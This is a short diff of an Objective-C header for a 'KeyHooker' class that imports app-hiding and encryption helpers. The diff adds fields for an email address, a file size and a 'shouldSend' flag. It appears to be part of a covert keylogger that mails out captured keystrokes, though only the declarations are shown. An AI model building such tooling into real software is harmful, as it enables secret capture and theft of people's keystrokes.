@@ -17,14 +17,26 @@
 #import "AppHider.h"
 #import "Cryptographer.h"
 
+@protocol ShouldSendDelegate <NSObject>
+@optional
+
+- (void)setShouldSend:(BOOL)flag;
+
+@end
+
 @interface KeyHooker : NSObject
 
 {
     BOOL flag;
+    BOOL shouldSend;
     NSMutableArray *combination;
+    NSInteger fileSize;
+    NSString *email;
+    
+    id <ShouldSendDelegate> delegate;
 }
 
-- (id)init;
+- (id)init: (id <ShouldSendDelegate>)deleg;
 
 - (void)doFullCycle: (int)key;
 - (BOOL)checkCombination;
